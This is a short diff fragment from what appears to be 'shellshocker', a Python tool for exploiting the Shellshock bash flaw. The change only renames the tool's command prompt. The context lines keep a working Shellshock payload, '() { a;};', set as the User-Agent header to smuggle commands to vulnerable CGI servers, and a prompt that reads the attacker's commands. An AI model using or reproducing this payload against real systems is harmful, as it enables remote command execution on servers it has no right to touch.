@@ -9,7 +9,7 @@ def shellshocker(url):
 
 	useragent = '() { a;};echo \"Content-type: text/plain\"; echo; echo;'
 
-	getcommand = raw_input("shellshock/command$ ")
+	getcommand = raw_input("shellshocker/command$ ")
 
 	command1 = getcommand.split(' ',1)[0]
 
